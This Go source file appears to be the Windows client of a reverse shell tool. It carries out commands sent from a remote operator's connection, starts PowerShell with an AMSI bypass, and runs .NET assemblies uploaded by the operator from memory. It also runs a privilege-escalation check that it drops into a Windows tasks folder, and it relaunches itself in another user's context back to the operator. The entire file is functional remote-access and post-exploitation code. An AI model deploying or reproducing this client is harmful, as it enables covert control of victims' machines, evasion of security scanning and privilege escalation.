package client

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"time"

	"../plugins"
	"../shell"
	"../utils"
	"../vulns"
	"github.com/hashicorp/yamux"
	"github.com/ropnop/go-clr"
)

// Run runs the mainloop of the shell
func Run(s *yamux.Session, c net.Conn) {
	defer c.Close()

	// open 2nd channel
	signalSession, err := s.Accept()
	if err != nil {
		fmt.Println(err)
	}
	signalScanner := bufio.NewScanner(signalSession)

	scanner := bufio.NewScanner(c)
	homedir, err := os.UserHomeDir()
	if err != nil {
		homedir = "C:"
	}
	// init
	plugins.Init(c)
	prompt(c)

	go func() {
		for signalScanner.Scan() {
			command := signalScanner.Text()
			//fmt.Printf("Command %s\n", command)
			switch command {
			case "!sigint":
				if shellPipeReader != nil && shellPipeWriter != nil && shellCmd != nil {
					//log.Println("Quitting shell (Ctrl+C)")
					shellCmd.Process.Kill()
					shellPipeReader.Close()
					shellPipeWriter.Close()
					shellCmd = nil
				}
			default:
				// pass
			}
		}
	}()

	for scanner.Scan() {
		command := scanner.Text()
		if len(command) > 1 {
			argv := splitArgs(command)
			// we only handle commands here that do something on the client side
			// commands that are shared between different os
			help := usage()
			help += "\n"
			help += "  !powershell\n"
			help += "    * starts powershell with AMSI Bypass\n"
			help += "  !rc <port>\n"
			help += "    * connects to a local bind shell and restarts this client over it\n"
			help += "  !runasps <username> <password> <domain>\n"
			help += "    * restart xc with the specified user using powershell\n"
			help += "  !vulns\n"
			help += "    * checks for common vulnerabilities\n"
			help += "  !net <sample.exe> <arg1> <arg2> ...\n"
			help += "    * Uploads & Runs a .NET assembly from memory\n"

			handled := handleSharedCommand(s, c, argv, help, homedir)
			// os specific commands
			if !handled {
				switch argv[0] {
				case "!vulns":
					// we also run privesc check
					privescCheck := "<PRIVESCCHECK>"
					path := "\\windows\\tasks\\temp.ps1"
					decodedScript, _ := base64.StdEncoding.DecodeString(privescCheck)
					ioutil.WriteFile(path, []byte(decodedScript), 0644)
					out, _ := shell.ExecPSOut(fmt.Sprintf(". %s;Invoke-PrivescCheck", path), false)
					c.Write([]byte(out))
					vulns.Check(c)
					os.Remove(path)
					prompt(c)
				case "!runasps":
					if len(argv) != 4 {
						c.Write([]byte("Usage: !runas <username> <password> <domain>\n"))
					} else {
						shell.RunAsPS(argv[1], argv[2], argv[3], c)
					}
					prompt(c)
				case "!powershell":
					handled = true
					//log.Println("Entering PowerShell")
					shellCmd, _ = shell.Powershell()
					shellPipeReader, shellPipeWriter = io.Pipe()
					shellCmd.Stdin = c
					shellCmd.Stdout = shellPipeWriter
					shellCmd.Stderr = shellPipeWriter
					go io.Copy(c, shellPipeReader)
					shellCmd.Start()
					shellCmd.Wait()
					//log.Println("Exiting PowerShell (exit)")
					prompt(c)
				case "!rc":
					if len(argv) == 2 {
						rPort := argv[1]
						lIP, lPort := utils.SplitAddress(c.RemoteAddr().String())
						err := rc(lIP, lPort, rPort)
						if err == nil {
							// no error, this shell should restart in a new user context
							return
						}
					} else {
						c.Write([]byte("Usage: !rc <port>\n"))
					}
					prompt(c)
				case "!net":
					// this does not capture output yet, so you have to write to a file
					if len(argv) > 2 {
						assembly := argv[1]
						args := argv[1:]
						bytes, _ := utils.UploadConnectRaw(s)

						// Todo: capture output somehow
						ret, err := clr.ExecuteByteArray("v4", bytes, args)
						if err != nil {
							log.Fatal(err)
						}
						// Todo: remove debug print
						fmt.Printf("Debug: %s returned %d\n", assembly, ret)
						//c.Write([]byte(out))
					} else {
						c.Write([]byte("!net <sample.exe> <arg1> <arg2> ..."))
					}
					prompt(c)
				default:
					shell.Exec(command, c)
					prompt(c)
				}
			}
		} else {
			prompt(c)
		}
	}
}

func rc(lIP string, lPort string, rPort string) error {
	conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%s", rPort))
	if err != nil {
		return err
	}
	path := shell.CopySelf()
	cmd := fmt.Sprintf("c:\\windows\\system32\\cmd.exe /c %s %s %s\r\n", path, lIP, lPort)
	conn.Write([]byte(cmd))
	time.Sleep(5000 * time.Millisecond)
	conn.Close()
	return nil
}
